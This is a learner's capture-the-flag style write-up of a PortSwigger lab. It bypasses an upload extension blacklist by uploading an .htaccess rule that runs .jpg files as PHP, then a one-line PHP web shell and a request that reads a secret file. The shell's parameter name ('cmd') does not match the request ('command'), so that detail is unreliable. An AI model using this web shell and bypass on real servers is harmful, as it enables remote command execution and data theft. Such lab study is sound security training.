# [Web shell upload via extension blacklist bypass] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-15
 
---
 
## Vulnerability / core concept
Extension Blacklist Bypass

## What made me stuck
After uploading both `.htaccess` and `webshell.php` files, when I tried to access `/files/avatars/webshell.php`, I received error and that page wouldn't load. That is why I thought this path is not available in this lab and tried other options that were rabbithole.
 
## What unblocked me
After looking at a hint, where it said that we need to upload two files, I instantly knew that my initial solution was right. After reloding the lab, it worked as expcted. Still do not know why it was bugging at first.
 
---


## Attack path
1) First we need to log in to have upload functionality.
2) After pressing upload and intercepting request, I sent it to Replay in Caido and started to analyze it. When I uploaded a `.php` file, it didn't accept it.
3) I tried lots of methods to bypass blacklist restriction. At first, I tried to use `.jpg.php` extention, which did not work, it got filtered. Then, I tried to use `.php.jpg` and this one got uploaded. I added `%00` (null byte) to it so I can remove the `.jpg` part and it worked again. However, I could not execute it and was receiving it in plain text form. Same with encoding: I encoded every letter, which worked to bypass the filter, but it did not work for execution of the file.
4) After these attempts I started to do research and found quite some way to execute an attack. Among them was uploading a `.htaccess` file. This hypertext access file is a directory level configuration file. Uploading this means we can set our own rules that will be executed in the web application immediately unlike main configuration file `httpd.conf` or `apache2.conf`. I added a rule in uploaded `.htaccess` file to execute all `.jpg` files as `.php` codes.
5) After uploading malicious `.htaccess` file all we need to do is to submit our `webshell.php` file using `.jpg` extension. Now, we can access `/files/avatars/webshell.jpg` and execute system commands to read `/home/carlos/secret` and solve the lab.

---


## Payload / key command
First file that I uploaded was `.htaccess` file with the following rule:
```bash
AddType application/x-httpd-php .jpg
```
This will execute all `.jpg` files as `.php`.


My `.php` payload is:
```php
<?php echo system($_GET['cmd']); ?>
```
After uploading these files, we need to send the following request:
```bash
GET /files/avatars/webshell.jpg?command=cat+/home/carlos/secret HTTP/1.1
...
```

---


## What I'd recognize faster next time
It is always important to think out of the box. When we encounter one problem, we should think of ways that will help us to bypass that problem so we can continue to exploit application. Moreover, it is important to restart web application sometimes to avoid rabbithole that I experienced with this one.


